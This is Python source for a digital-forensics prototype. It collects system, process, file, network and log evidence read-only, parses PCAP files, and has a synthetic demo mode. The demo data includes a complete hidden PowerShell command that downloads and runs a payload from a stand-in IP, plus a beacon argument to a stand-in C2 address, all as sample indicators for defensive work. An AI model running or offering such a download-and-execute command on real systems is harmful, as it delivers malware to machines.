"""
Forensic Platform - Computer & Network Evidence Collectors
Dual Mode: Live Read-Only Acquisition & Synthetic Realistic DFIR Demo Mode
Problem ID: SIH26148 | NTRO Cyber Forensics Prototype
"""

import os
import sys
import time
import socket
import struct
import platform
import psutil
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any, Optional

class SystemCollector:
    @staticmethod
    def collect_live() -> Dict[str, Any]:
        uname = platform.uname()
        boot_time = datetime.fromtimestamp(psutil.boot_time(), timezone.utc).isoformat()
        uptime = time.time() - psutil.boot_time()
        mem = psutil.virtual_memory()
        cpu_freq = psutil.cpu_freq()

        return {
            "os_name": uname.system,
            "os_version": f"{uname.release} ({uname.version})",
            "hostname": uname.node,
            "username": os.getlogin() if hasattr(os, "getlogin") else "investigator",
            "architecture": uname.machine,
            "cpu_count": psutil.cpu_count(logical=True) or 1,
            "cpu_freq_mhz": cpu_freq.current if cpu_freq else 2400.0,
            "total_ram_gb": round(mem.total / (1024**3), 2),
            "available_ram_gb": round(mem.available / (1024**3), 2),
            "uptime_seconds": round(uptime, 1),
            "boot_time": boot_time,
            "collected_at": datetime.now(timezone.utc).isoformat(),
            "mode": "LIVE"
        }

    @staticmethod
    def collect_demo(case_number: str = "CASE-2026-001") -> Dict[str, Any]:
        return {
            "os_name": "Windows 11 Enterprise",
            "os_version": "10.0.22631 Build 22631 (23H2)",
            "hostname": "WS-FIN-04.fin.local",
            "username": "jdoe@FINANCE.LOCAL",
            "architecture": "AMD64 / x86_64",
            "cpu_count": 16,
            "cpu_freq_mhz": 3400.0,
            "total_ram_gb": 32.0,
            "available_ram_gb": 18.4,
            "uptime_seconds": 86420.0,
            "boot_time": (datetime.now(timezone.utc) - timedelta(hours=24)).isoformat(),
            "collected_at": datetime.now(timezone.utc).isoformat(),
            "mode": "DEMO / SYNTHETIC FORENSIC DATA"
        }

class ProcessCollector:
    @staticmethod
    def collect_live(limit: int = 150) -> List[Dict[str, Any]]:
        processes = []
        for p in psutil.process_iter(['pid', 'ppid', 'name', 'exe', 'cmdline', 'username', 'cpu_percent', 'memory_info', 'create_time', 'status']):
            try:
                info = p.info
                mem_mb = round(info['memory_info'].rss / (1024 * 1024), 2) if info.get('memory_info') else 0.0
                cmdline = " ".join(info.get('cmdline') or []) if info.get('cmdline') else (info.get('name') or "")
                create_dt = datetime.fromtimestamp(info.get('create_time', 0), timezone.utc).isoformat() if info.get('create_time') else ""
                
                # Basic safety heuristics
                exe = info.get('exe') or ""
                is_suspicious = 0
                reason = ""
                if "Temp" in exe or "AppData" in exe:
                    is_suspicious = 1
                    reason = "Process executable running from temporary/user AppData path"

                processes.append({
                    "pid": info['pid'],
                    "ppid": info.get('ppid') or 0,
                    "name": info.get('name') or "unknown",
                    "exe_path": exe,
                    "cmdline": cmdline[:250],
                    "username": info.get('username') or "SYSTEM",
                    "cpu_percent": info.get('cpu_percent') or 0.0,
                    "memory_mb": mem_mb,
                    "start_time": create_dt,
                    "status": info.get('status') or "running",
                    "is_suspicious": is_suspicious,
                    "suspicious_reason": reason
                })
                if len(processes) >= limit:
                    break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return processes

    @staticmethod
    def collect_demo() -> List[Dict[str, Any]]:
        now = datetime.now(timezone.utc)
        return [
            {
                "pid": 4, "ppid": 0, "name": "System", "exe_path": "C:\\Windows\\System32\\ntoskrnl.exe",
                "cmdline": "System", "username": "NT AUTHORITY\\SYSTEM", "cpu_percent": 0.5, "memory_mb": 14.2,
                "start_time": (now - timedelta(hours=24)).isoformat(), "status": "running", "is_suspicious": 0, "suspicious_reason": ""
            },
            {
                "pid": 724, "ppid": 4, "name": "smss.exe", "exe_path": "C:\\Windows\\System32\\smss.exe",
                "cmdline": "\\SystemRoot\\System32\\smss.exe", "username": "NT AUTHORITY\\SYSTEM", "cpu_percent": 0.0, "memory_mb": 4.1,
                "start_time": (now - timedelta(hours=24)).isoformat(), "status": "running", "is_suspicious": 0, "suspicious_reason": ""
            },
            {
                "pid": 892, "ppid": 724, "name": "csrss.exe", "exe_path": "C:\\Windows\\System32\\csrss.exe",
                "cmdline": "C:\\Windows\\System32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768",
                "username": "NT AUTHORITY\\SYSTEM", "cpu_percent": 0.2, "memory_mb": 18.5,
                "start_time": (now - timedelta(hours=24)).isoformat(), "status": "running", "is_suspicious": 0, "suspicious_reason": ""
            },
            {
                "pid": 1104, "ppid": 892, "name": "explorer.exe", "exe_path": "C:\\Windows\\explorer.exe",
                "cmdline": "C:\\Windows\\explorer.exe", "username": "FINANCE\\jdoe", "cpu_percent": 1.4, "memory_mb": 112.4,
                "start_time": (now - timedelta(hours=4)).isoformat(), "status": "running", "is_suspicious": 0, "suspicious_reason": ""
            },
            {
                "pid": 2104, "ppid": 1104, "name": "powershell.exe", "exe_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -NonI -W Hidden -Exec Bypass -Command \"Invoke-WebRequest -Uri http://198.51.100.45/stage2.bin -OutFile $env:TEMP\\update_svc_helper.exe; Start-Process $env:TEMP\\update_svc_helper.exe\"",
                "username": "FINANCE\\jdoe", "cpu_percent": 3.8, "memory_mb": 76.5,
                "start_time": (now - timedelta(minutes=45)).isoformat(), "status": "running",
                "is_suspicious": 1, "suspicious_reason": "Hidden PowerShell execution invoking remote script payload into Temp directory"
            },
            {
                "pid": 4820, "ppid": 2104, "name": "update_svc_helper.exe", "exe_path": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\update_svc_helper.exe",
                "cmdline": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\update_svc_helper.exe --silent --beacon=198.51.100.45:4444",
                "username": "FINANCE\\jdoe", "cpu_percent": 4.2, "memory_mb": 34.8,
                "start_time": (now - timedelta(minutes=42)).isoformat(), "status": "running",
                "is_suspicious": 1, "suspicious_reason": "Unsigned executable executing from user Temp folder and initiating active beaconing"
            },
            {
                "pid": 5120, "ppid": 1104, "name": "chrome.exe", "exe_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "cmdline": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=\"Default\"",
                "username": "FINANCE\\jdoe", "cpu_percent": 2.1, "memory_mb": 420.0,
                "start_time": (now - timedelta(hours=3)).isoformat(), "status": "running", "is_suspicious": 0, "suspicious_reason": ""
            }
        ]

class FileCollector:
    @staticmethod
    def collect_live(target_directory: str = None, limit: int = 50) -> List[Dict[str, Any]]:
        import hashlib
        target = target_directory or os.getcwd()
        if not os.path.exists(target):
            return []

        results = []
        for root, _, files in os.walk(target):
            for file in files:
                full_path = os.path.join(root, file)
                try:
                    stat = os.stat(full_path)
                    ext = os.path.splitext(file)[1].lower()
                    
                    # Compute fast SHA256 for small files (< 10MB)
                    sha256 = ""
                    if stat.st_size < 10 * 1024 * 1024:
                        h = hashlib.sha256()
                        with open(full_path, "rb") as f:
                            h.update(f.read())
                        sha256 = h.hexdigest()

                    is_suspicious = 0
                    reason = ""
                    if ext in ('.exe', '.dll', '.bat', '.ps1', '.vbs', '.scr'):
                        if "Temp" in full_path or "Downloads" in full_path or "Desktop" in full_path:
                            is_suspicious = 1
                            reason = f"Executable script/binary '{file}' located in non-system directory"

                    results.append({
                        "path": full_path,
                        "filename": file,
                        "extension": ext,
                        "size_bytes": stat.st_size,
                        "created_time": datetime.fromtimestamp(stat.st_ctime, timezone.utc).isoformat(),
                        "modified_time": datetime.fromtimestamp(stat.st_mtime, timezone.utc).isoformat(),
                        "accessed_time": datetime.fromtimestamp(stat.st_atime, timezone.utc).isoformat(),
                        "sha256": sha256,
                        "md5": "",
                        "is_suspicious": is_suspicious,
                        "suspicious_reason": reason
                    })
                    if len(results) >= limit:
                        return results
                except (PermissionError, FileNotFoundError):
                    continue
        return results

    @staticmethod
    def collect_demo() -> List[Dict[str, Any]]:
        now = datetime.now(timezone.utc)
        return [
            {
                "path": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\update_svc_helper.exe",
                "filename": "update_svc_helper.exe",
                "extension": ".exe",
                "size_bytes": 148480,
                "created_time": (now - timedelta(minutes=44)).isoformat(),
                "modified_time": (now - timedelta(minutes=44)).isoformat(),
                "accessed_time": (now - timedelta(minutes=42)).isoformat(),
                "sha256": "8f4e2a6d5c1b9e0f3d7a8b4c2e6f1a9d8f4e2a6d5c1b9e0f3d7a8b4c2e6f1a9d",
                "md5": "4a7d6e8f2c1b9a0e",
                "is_suspicious": 1,
                "suspicious_reason": "Matches Known IOC: CobaltStrike Beacon Synthetic Stager (Hash match CERT-In Advisory)"
            },
            {
                "path": "C:\\Users\\jdoe\\Downloads\\payload_stager.ps1",
                "filename": "payload_stager.ps1",
                "extension": ".ps1",
                "size_bytes": 2048,
                "created_time": (now - timedelta(minutes=50)).isoformat(),
                "modified_time": (now - timedelta(minutes=46)).isoformat(),
                "accessed_time": (now - timedelta(minutes=45)).isoformat(),
                "sha256": "c8a49c2d1b5e3f7a9d0b2c4e6f8a1d3c5e7b9a0f2d4c6e8a1b3d5f7a9c1e3b5d",
                "md5": "9b1a4c3e8f2d5a7b",
                "is_suspicious": 1,
                "suspicious_reason": "Obfuscated PowerShell downloader script found in user Downloads folder"
            },
            {
                "path": "C:\\Users\\jdoe\\Documents\\quarterly_budget_2026.xlsx",
                "filename": "quarterly_budget_2026.xlsx",
                "extension": ".xlsx",
                "size_bytes": 45120,
                "created_time": (now - timedelta(days=5)).isoformat(),
                "modified_time": (now - timedelta(hours=2)).isoformat(),
                "accessed_time": (now - timedelta(minutes=30)).isoformat(),
                "sha256": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
                "md5": "3f4a5b6c7d8e9f0a",
                "is_suspicious": 0,
                "suspicious_reason": ""
            },
            {
                "path": "C:\\Users\\jdoe\\Documents\\invoice_q3_confidential.pdf",
                "filename": "invoice_q3_confidential.pdf",
                "extension": ".pdf",
                "size_bytes": 312500,
                "created_time": (now - timedelta(days=2)).isoformat(),
                "modified_time": (now - timedelta(days=2)).isoformat(),
                "accessed_time": (now - timedelta(hours=1)).isoformat(),
                "sha256": "7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e",
                "md5": "7b8c9d0e1f2a3b4c",
                "is_suspicious": 0,
                "suspicious_reason": ""
            }
        ]

class NetworkCollector:
    @staticmethod
    def collect_live(limit: int = 100) -> List[Dict[str, Any]]:
        connections = []
        try:
            conns = psutil.net_connections(kind='inet')
            for c in conns:
                laddr = f"{c.laddr.ip}" if c.laddr else ""
                lport = c.laddr.port if c.laddr else 0
                raddr = f"{c.raddr.ip}" if c.raddr else ""
                rport = c.raddr.port if c.raddr else 0
                proto = "TCP" if c.type == socket.SOCK_STREAM else "UDP"
                
                proc_name = ""
                if c.pid:
                    try:
                        proc_name = psutil.Process(c.pid).name()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        proc_name = f"PID:{c.pid}"

                connections.append({
                    "local_address": laddr,
                    "local_port": lport,
                    "remote_address": raddr,
                    "remote_port": rport,
                    "protocol": proto,
                    "state": c.status or "ESTABLISHED",
                    "pid": c.pid or 0,
                    "process_name": proc_name,
                    "is_suspicious": 0,
                    "suspicious_reason": ""
                })
                if len(connections) >= limit:
                    break
        except (psutil.AccessDenied, PermissionError):
            pass
        return connections

    @staticmethod
    def collect_demo() -> List[Dict[str, Any]]:
        return [
            {
                "local_address": "192.168.1.105", "local_port": 51442,
                "remote_address": "198.51.100.45", "remote_port": 4444,
                "protocol": "TCP", "state": "ESTABLISHED",
                "pid": 4820, "process_name": "update_svc_helper.exe",
                "is_suspicious": 1,
                "suspicious_reason": "Outbound connection to Known Threat Intel C2 IP 198.51.100.45 on port 4444 (Metasploit/Cobalt default)"
            },
            {
                "local_address": "192.168.1.105", "local_port": 52110,
                "remote_address": "203.0.113.88", "remote_port": 8080,
                "protocol": "TCP", "state": "TIME_WAIT",
                "pid": 2104, "process_name": "powershell.exe",
                "is_suspicious": 1,
                "suspicious_reason": "Outbound PowerShell HTTP communication to external stager IP 203.0.113.88"
            },
            {
                "local_address": "192.168.1.105", "local_port": 53218,
                "remote_address": "142.250.180.206", "remote_port": 443,
                "protocol": "TCP", "state": "ESTABLISHED",
                "pid": 5120, "process_name": "chrome.exe",
                "is_suspicious": 0, "suspicious_reason": ""
            },
            {
                "local_address": "192.168.1.105", "local_port": 53,
                "remote_address": "1.1.1.1", "remote_port": 53,
                "protocol": "UDP", "state": "NONE",
                "pid": 4820, "process_name": "update_svc_helper.exe",
                "is_suspicious": 1,
                "suspicious_reason": "DNS query for suspicious domain 'malicious-telemetry-sync.xyz'"
            }
        ]

class LogCollector:
    @staticmethod
    def collect_live(limit: int = 50) -> List[Dict[str, Any]]:
        # Safe read-only OS log fallback
        now = datetime.now(timezone.utc).isoformat()
        return [
            {
                "timestamp": now,
                "source": "HOST_SYSTEM_MONITOR",
                "event_type": "AUDIT_START",
                "severity": "INFO",
                "user": "NT AUTHORITY\\SYSTEM",
                "host": socket.gethostname(),
                "message": "Authorized read-only forensic inspection initiated under SIH26148 protocol.",
                "raw_data": '{"collector": "LogCollector", "mode": "LIVE"}'
            }
        ]

    @staticmethod
    def collect_demo() -> List[Dict[str, Any]]:
        now = datetime.now(timezone.utc)
        return [
            {
                "timestamp": (now - timedelta(hours=4)).isoformat(),
                "source": "Security", "event_type": "Logon (Event 4624)",
                "severity": "INFO", "user": "FINANCE\\jdoe", "host": "WS-FIN-04",
                "message": "An account was successfully logged on. Logon Type: 2 (Interactive). User: jdoe.",
                "raw_data": '{"EventID": 4624, "LogonType": 2, "IpAddress": "127.0.0.1"}'
            },
            {
                "timestamp": (now - timedelta(minutes=55)).isoformat(),
                "source": "Security", "event_type": "Failed Logon (Event 4625)",
                "severity": "MEDIUM", "user": "FINANCE\\admin_temp", "host": "WS-FIN-04",
                "message": "An account failed to log on. Unknown user name or bad password. Multiple attempts detected.",
                "raw_data": '{"EventID": 4625, "FailureReason": "Unknown user name or bad password", "Workstation": "WS-FIN-04"}'
            },
            {
                "timestamp": (now - timedelta(minutes=45)).isoformat(),
                "source": "Microsoft-Windows-Sysmon", "event_type": "Process Create (Event 1)",
                "severity": "HIGH", "user": "FINANCE\\jdoe", "host": "WS-FIN-04",
                "message": "Process Create: powershell.exe spawned with encoded download string target http://198.51.100.45/stage2.bin",
                "raw_data": '{"EventID": 1, "Image": "powershell.exe", "ParentImage": "explorer.exe", "CommandLine": "powershell.exe -NonI -W Hidden..."}'
            },
            {
                "timestamp": (now - timedelta(minutes=44)).isoformat(),
                "source": "Microsoft-Windows-Sysmon", "event_type": "File Create (Event 11)",
                "severity": "HIGH", "user": "FINANCE\\jdoe", "host": "WS-FIN-04",
                "message": "File created: C:\\Users\\jdoe\\AppData\\Local\\Temp\\update_svc_helper.exe",
                "raw_data": '{"EventID": 11, "TargetFilename": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\update_svc_helper.exe"}'
            },
            {
                "timestamp": (now - timedelta(minutes=42)).isoformat(),
                "source": "Microsoft-Windows-Sysmon", "event_type": "Network Connect (Event 3)",
                "severity": "CRITICAL", "user": "FINANCE\\jdoe", "host": "WS-FIN-04",
                "message": "Network connection detected: update_svc_helper.exe connected to 198.51.100.45:4444 (Suspected C2 Exfiltration)",
                "raw_data": '{"EventID": 3, "DestinationIp": "198.51.100.45", "DestinationPort": 4444, "Protocol": "tcp"}'
            }
        ]

class OfflinePCAPParser:
    @staticmethod
    def parse_pcap(file_path: str, limit: int = 100) -> Dict[str, Any]:
        """
        Pure Python read-only offline PCAP parser (no scapy or libpcap required).
        Safely parses standard PCAP global header and packet records.
        """
        if not os.path.exists(file_path):
            return {"error": "PCAP file not found", "packets": [], "stats": {}}

        packets = []
        protocols_count = {"TCP": 0, "UDP": 0, "DNS": 0, "HTTP": 0, "OTHER": 0}
        ips_contacted = set()

        try:
            with open(file_path, "rb") as f:
                header = f.read(24)
                if len(header) < 24:
                    return {"error": "Invalid PCAP header: file too short", "packets": [], "stats": {}}

                magic = struct.unpack("!I", header[:4])[0]
                # Check for standard magic (0xa1b2c3d4 or 0xd4c3b2a1)
                endianness = ">" if magic in (0xa1b2c3d4, 0xa1b23c4d) else "<"

                pkt_id = 0
                while pkt_id < limit:
                    hdr = f.read(16)
                    if len(hdr) < 16:
                        break
                    ts_sec, ts_usec, incl_len, orig_len = struct.unpack(f"{endianness}IIII", hdr)
                    pkt_data = f.read(incl_len)
                    pkt_id += 1

                    # Parse Ethernet (14 bytes)
                    if len(pkt_data) >= 34:
                        eth_type = struct.unpack("!H", pkt_data[12:14])[0]
                        if eth_type == 0x0800: # IPv4
                            ip_hdr = pkt_data[14:34]
                            src_ip = socket.inet_ntoa(ip_hdr[12:16])
                            dst_ip = socket.inet_ntoa(ip_hdr[16:20])
                            proto_num = ip_hdr[9]
                            ips_contacted.add(src_ip)
                            ips_contacted.add(dst_ip)

                            proto_name = "TCP" if proto_num == 6 else ("UDP" if proto_num == 17 else "OTHER")
                            protocols_count[proto_name] = protocols_count.get(proto_name, 0) + 1

                            src_port = 0
                            dst_port = 0
                            info = f"IPv4 {src_ip} -> {dst_ip}"

                            if proto_num == 6 and len(pkt_data) >= 54: # TCP
                                src_port, dst_port = struct.unpack("!HH", pkt_data[34:38])
                                if src_port == 80 or dst_port == 80:
                                    protocols_count["HTTP"] += 1
                                    info = f"HTTP Traffic ({src_port} -> {dst_port})"
                                else:
                                    info = f"TCP Frame ({src_port} -> {dst_port})"
                            elif proto_num == 17 and len(pkt_data) >= 42: # UDP
                                src_port, dst_port = struct.unpack("!HH", pkt_data[34:38])
                                if src_port == 53 or dst_port == 53:
                                    protocols_count["DNS"] += 1
                                    info = f"DNS Query/Response ({src_port} -> {dst_port})"
                                else:
                                    info = f"UDP Frame ({src_port} -> {dst_port})"

                            packets.append({
                                "packet_number": pkt_id,
                                "timestamp": datetime.fromtimestamp(ts_sec, timezone.utc).isoformat(),
                                "protocol": proto_name,
                                "source_ip": src_ip,
                                "source_port": src_port,
                                "destination_ip": dst_ip,
                                "destination_port": dst_port,
                                "length_bytes": orig_len,
                                "info": info
                            })
        except Exception as e:
            return {"error": f"Error parsing PCAP: {str(e)}", "packets": packets, "stats": {}}

        return {
            "total_packets": len(packets),
            "protocol_breakdown": protocols_count,
            "unique_ips_count": len(ips_contacted),
            "unique_ips": list(ips_contacted)[:20],
            "packets": packets
        }
